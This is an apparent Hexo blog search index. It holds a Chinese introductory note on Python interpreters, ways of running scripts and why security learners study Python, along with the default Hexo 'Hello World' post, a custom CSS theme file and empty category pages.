CPython</h4><p>当从Python官方网站下载并安装好Python3.8后，就直接获得了一个官方版本的解释器：Cpython，这个解释器</p><p>是用C语言开发的，所以叫CPython，在命名行下运行python，就是启动CPython解释器，CPython是使用最广</p><p>的Python解释器。</p><h4 id="2-2-2-IPython"><a href="#2-2-2-IPython" class="headerlink" title="2.2.2 IPython"></a>2.2.2 IPython</h4><p>IPython是基于CPython之上的一个交互式解释器，也就是说，IPython只是在交互方式上有所增强，但是执行</p><p>Python代码的功能和CPython是完全一样的，好比很多国产浏览器虽然外观不同，但内核其实是调用了IE。</p><h4 id="2-2-3-PyPy"><a href="#2-2-3-PyPy" class="headerlink" title="2.2.3 PyPy"></a>2.2.3 PyPy</h4><p>PyPy是另一个Python解释器，它的目标是执行速度，PyPy采用JIT技术，对Python代码进行动态编译，所以可以</p><p>显著提高Python代码的执行速度。</p><h4 id="2-2-4-Jython"><a href="#2-2-4-Jython" class="headerlink" title="2.2.4 Jython"></a>2.2.4 Jython</h4><p>Jython是运行在Java平台上的Python解释器，可以直接把Python代码编译成Java字节码执行。</p><h4 id="2-2-5-IronPython"><a href="#2-2-5-IronPython" class="headerlink" title="2.2.5 IronPython"></a>2.2.5 IronPython</h4><p>IronPython和Jython类似，只不过IronPython是运行在微软.Net平台上的Python解释器，可以直接把Python代</p><p>码编译成.Net的字节码。</p><p><strong>在Python的解释器中，使用广泛的是CPython，对于Python的编译，除了可以采用以上解释器进行编译外，技术高超的开发者还可以按照自己的需求自行编写Python解释器来执行Python代码，十分的方便!</strong></p><h3 id="2-3-python解释器的安装"><a href="#2-3-python解释器的安装" class="headerlink" title="2.3 python解释器的安装"></a>2.3 python解释器的安装</h3><blockquote><p>见笔记  1.python安装和pip换源.md</p></blockquote><h3 id="2-4-运行python程序的两种方式"><a href="#2-4-运行python程序的两种方式" class="headerlink" title="2.4 运行python程序的两种方式"></a>2.4 运行python程序的两种方式</h3><h4 id="2-4-1-交互式"><a href="#2-4-1-交互式" class="headerlink" title="2.4.1 交互式"></a>2.4.1 交互式</h4><p>即时得到程序的运行结果，但是代码没有永久保存，多用于调试，比如 可以拿来当计算器用。</p><p>打开命令行，输入 python，然后就可以编写代码了（注意编写用的符号全是英文的）</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411155458265.png" alt="image-20220411155458265"></p><p>退出是 <code>exit()</code> </p><h4 id="2-4-2-脚本的方式"><a href="#2-4-2-脚本的方式" class="headerlink" title="2.4.2 脚本的方式"></a>2.4.2 脚本的方式</h4><p>把程序写到一个文件中（约定俗称文件后缀名为.py）, 然后用python解释器，解释执行里面的内容。</p><p><code>python解释器 + 空格 + 文件路径</code>（注意命令路径中不能有空格）</p><p>示例</p><p>在桌面新建一个<code>demo.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello word&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后使用python解释器运行该py文件</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411155727896.png" alt="image-20220411155727896"></p><p>虽然这样可以将代码永久保存了，但是每次执行都要用命令行，而且用的文本编辑器，写代码无任何提示。（后面会介绍到集成开发环境）, 即使用 <code>pycharm</code> 编写py脚本</p><h3 id="2-5-一个python程序运行的三个步骤"><a href="#2-5-一个python程序运行的三个步骤" class="headerlink" title="2.5 一个python程序运行的三个步骤"></a>2.5 一个python程序运行的三个步骤</h3><ul><li><p>python <code> D:\桌面\demo.py</code>    执行python程序经历的三个步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 1.先启动python解释器，相当于启动了一个文本编辑器</span><br><span class="line">- 2.解释器会发送系统调用，把demo.py的内容，从硬盘中读取出来，</span><br><span class="line">    并加载到内存，此时demo.py中的内容全部为普通字符，没有任何意义</span><br><span class="line">- 3.按下回车，解释器开始解释执行刚刚读到内存的demo.py的代码，开始识别python语法 , 执行代码</span><br></pre></td></tr></table></figure></li><li><p>对比文本编辑器读取 C:\a\b\c.py文件 内容也经历了三个步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、先启动文本编辑器</span><br><span class="line">2、文本编辑器会发送系统调用，把c.py的内容从硬盘读入内存</span><br><span class="line">3、文本编辑会将刚刚读入内存的内容控制输出到屏幕上，让用户看到结果</span><br></pre></td></tr></table></figure></li><li><p>总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二者在前两个阶段做的事情完全一致</span><br><span class="line">唯一不同的就是第三个阶段对读入内存的python代码的处理方式不同,</span><br><span class="line">一个检测语法是否正确，一个不检测。</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-集成开发环境"><a href="#3-集成开发环境" class="headerlink" title="3. 集成开发环境"></a>3. 集成开发环境</h2><blockquote><p>见 2.pycharm破解激活</p></blockquote><h2 id="4-python可以做什么"><a href="#4-python可以做什么" class="headerlink" title="4. python可以做什么"></a>4. python可以做什么</h2><table><thead><tr><th><strong>应用方向</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>网路爬虫</td><td>Google 等搜索引擎公司大量地使用 Python 语言编写网络爬虫。</td></tr><tr><td>数据分析</td><td>用爬虫爬到了大量的数据之后最终的目的就是分析数据。</td></tr><tr><td>机器学习</td><td>机器学习就是人工智能的一个分支，应用有自然语言处理，搜索引擎，各种识别技术，数据挖掘等等。</td></tr><tr><td>WEB应用&#x2F;小程序开发</td><td>国内：豆瓣&#x2F;知乎(以前是python,现在是go) 国外：YouTube 使用的是Python作为WEB开发基础语言。</td></tr><tr><td>APP应用开发</td><td>Python 可以开发OS X，Linux，Windows，iOS，Android 等平台的应用。</td></tr><tr><td>游戏开发</td><td>Python开发的游戏几乎可以运行在所有常用的操作系统里面。</td></tr><tr><td>自动化脚本</td><td>频繁、重复、无脑的操作都可以使用Python脚本代替操作，以此节省大量时间</td></tr></tbody></table><h2 id="5-python语言的特点"><a href="#5-python语言的特点" class="headerlink" title="5. python语言的特点"></a>5. python语言的特点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法简洁 : 弱类型语言不多哔哔</span><br><span class="line">可跨平台 : 只要能够安装解释器哪里都能运行</span><br><span class="line">应用广泛 : 上到机器学习下到嵌入式</span><br><span class="line">可读性强 : 通过强制缩进体现语句间的逻辑关系提高了程序的可读性</span><br><span class="line">模式多样 : 语法层面同时支持面向过程和面向对象两种编程方式</span><br><span class="line">粘性扩展 : 通过接口和函数集成其他语言编写的代码</span><br><span class="line">开源理念 : 解释器众多，代码也能加密...</span><br><span class="line">库类丰富 : 再造一个轮子也不嫌多</span><br></pre></td></tr></table></figure><h2 id="6-我们安全学习python是为了什么"><a href="#6-我们安全学习python是为了什么" class="headerlink" title="6. 我们安全学习python是为了什么?"></a>6. 我们安全学习python是为了什么?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. python语法简洁 , 容易上手 , 编写一些渗透测试工具更加方便</span><br><span class="line">2. 相对于其他 c , java等更易于编写poc</span><br><span class="line">3. 完成一些批量的检测 , 如批量检测漏洞是否存在</span><br><span class="line">4. 批量利用</span><br></pre></td></tr></table></figure><p>渗透或者说搞安全</p><h3 id="必须要掌握一门编程语言-因为代码才是根本"><a href="#必须要掌握一门编程语言-因为代码才是根本" class="headerlink" title="必须要掌握一门编程语言 , 因为代码才是根本"></a><code>必须要掌握一门编程语言</code> , 因为代码才是根本</h3><p>掌握程度 , 相对于我们当前的领域要达到能够直接拿过来就能写 ( 或者2开 ) 的要求  , 而且这也是面试中对岗位的一个硬性需求</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/02/hello-world/"/>
      <url>/2023/04/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 代码框主题 */#article-container figure.highlight {  border-radius: 10px;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>文章分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>文章分类</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
